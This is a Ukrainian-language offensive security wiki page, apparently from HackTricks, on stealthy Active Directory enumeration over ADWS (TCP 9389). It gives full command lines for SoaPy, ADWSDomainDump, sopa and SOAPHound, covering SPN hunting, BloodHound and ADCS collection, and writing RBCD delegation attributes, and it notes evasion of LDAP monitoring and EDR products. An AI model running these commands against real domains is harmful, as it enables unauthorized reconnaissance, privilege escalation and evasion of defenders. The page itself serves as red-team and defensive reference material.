# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) увімкнено за замовчуванням на кожному Domain Controller починаючи з Windows Server 2008 R2 і слухає TCP **9389**. Незважаючи на назву, **HTTP не використовується**. Натомість сервіс надає дані в стилі LDAP через стек пропрієтарних .NET framing протоколів:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульований у цих бінарних SOAP-фреймах і йде по незвичному порту, **перерахування через ADWS значно менш ймовірно буде інспектовано, відфільтровано або підписано, ніж класичний LDAP/389 & 636 трафік**. Для операторів це означає:

* Більш прихований recon — Blue teams часто концентруються на LDAP-запитах.
* Можливість збирати з **non-Windows hosts (Linux, macOS)** шляхом тунелювання 9389/TCP через SOCKS proxy.
* Ті самі дані, які ви отримали б через LDAP (users, groups, ACLs, schema тощо) і можливість виконувати **записи** (наприклад `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодії ADWS реалізовані поверх WS-Enumeration: кожний запит починається з повідомлення `Enumerate`, яке визначає LDAP-фільтр/атрибути і повертає `EnumerationContext` GUID, за яким слідує одне або кілька повідомлень `Pull`, що потоково повертають результати у межах вікна, визначеного сервером. Contexts витікають приблизно через ~30 хвилин, тому інструменти мають або сторінкувати результати, або розбивати фільтри (префіксні запити по CN), щоб уникнути втрати стану. При запиті security descriptors вкажіть контроль `LDAP_SERVER_SD_FLAGS_OID`, щоб опустити SACLs, інакше ADWS просто видаляє атрибут `nTSecurityDescriptor` зі свого SOAP-відповіді.

> ПРИМІТКА: ADWS також використовується багатьма RSAT GUI/PowerShell інструментами, тому трафік може зливатися з легітимною адміністративною активністю.

## SoaPy – нативний Python-клієнт

[SoaPy](https://github.com/logangoins/soapy) — це **повна ре-реалізація стеку протоколів ADWS на чистому Python**. Він складає NBFX/NBFSE/NNS/NMF фрейми байт у байт, дозволяючи збирати з Unix-подібних систем без використання .NET runtime.

### Ключові можливості

* Підтримка **proxying through SOCKS** (корисно для C2 implants).
* Точні фільтри пошуку ідентичні LDAP `-q '(objectClass=user)'`.
* Опціональні **операції запису** ( `--set` / `--delete` ).
* **BOFHound output mode** для прямого імпорту в BloodHound.
* Прапорець `--parse` для красивоформатування timestamps / `userAccountControl`, коли потрібна читаємість людиною.

### Прапорці цілеспрямованого збору та операції запису

SoaPy постачається з підібраними перемикачами, які відтворюють найпоширеніші LDAP-hunting завдання через ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, плюс сирі `--query` / `--filter` ручки для кастомних витягів. Поєднуйте їх із примітивами запису, такими як `--rbcd <source>` (встановлює `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging для таргетованого Kerberoasting) та `--asrep` (перемикає `DONT_REQ_PREAUTH` у `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Використовуйте той же host/credentials, щоб негайно weaponise знахідки: dump RBCD-capable об'єкти за допомогою `--rbcds`, потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'`, щоб stage Resource-Based Constrained Delegation chain (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) для повного шляху зловживання).

### Встановлення (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Форк `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS по TCP/9389, щоб зменшити спрацьовування сигнатур LDAP.
* Виконує початкову перевірку доступності порту 9389, якщо не передано `--force` (пропускає перевірку, якщо сканування портів є шумним/фільтрується).
* Тестувалося проти Microsoft Defender for Endpoint та CrowdStrike Falcon з успішним обхідом, описаним у README.

### Встановлення
```bash
pipx install .
```
### Використання
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Типовий вивід реєструє перевірку доступності 9389, ADWS bind і початок/завершення dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Практичний клієнт для ADWS на Golang

Подібно до soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколу ADWS (MS-NNS + MC-NMF + SOAP) на Golang, надаючи прапорці командного рядка для виконання ADWS-викликів, таких як:

* **Пошук і отримання об'єктів** - `query` / `get`
* **Життєвий цикл об'єкта** - `create [user|computer|group|ou|container|custom]` та `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* та інші, наприклад `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, тощо.

## SOAPHound – збір великих обсягів через ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це .NET-колектор, який утримує всі LDAP-взаємодії всередині ADWS і генерує JSON, сумісний з BloodHound v4. Він одноразово будує повний кеш `objectSid`, `objectGUID`, `distinguishedName` та `objectClass` (`--buildcache`), після чого повторно використовує його для високопродуктивних проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (AD-integrated DNS), тож лише ~35 критичних атрибутів покидають DC. AutoSplit (`--autosplit --threshold <N>`) автоматично розбиває запити по префіксу CN на шард(и), щоб укладатися в 30-хвилинний таймаут EnumerationContext у великих лісах.

Типовий робочий процес на VM оператора, приєднаній до домену:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Експортований JSON напряму інтегрується в робочі процеси SharpHound/BloodHound — див. [BloodHound methodology](bloodhound.md) для ідей щодо подальшої візуалізації графів. AutoSplit робить SOAPHound стійким у лісах з мільйонами об’єктів, одночасно зберігаючи кількість запитів нижчою, ніж у знімках типу ADExplorer.

## Прихована схема збору AD

Нижче показано робочий процес, який демонструє, як перерахувати **domain & ADCS objects** через ADWS, конвертувати їх у BloodHound JSON і шукати шляхи атак на основі сертифікатів — усе з Linux:

1. **Tunnel 9389/TCP** з цільової мережі на вашу машину (наприклад через Chisel, Meterpreter, SSH dynamic port-forward тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використайте SoaPy’s `--proxyHost/--proxyPort`.

2. **Зберіть об'єкт кореневого домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Зібрати об'єкти, пов'язані з ADCS, з Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Перетворити в BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Завантажте ZIP** у GUI BloodHound і виконайте cypher queries, такі як `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8, тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Поєднайте це з `s4u2proxy`/`Rubeus /getticket` для повного ланцюга **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Огляд інструментів

| Призначення | Інструмент | Примітки |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Посилання

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
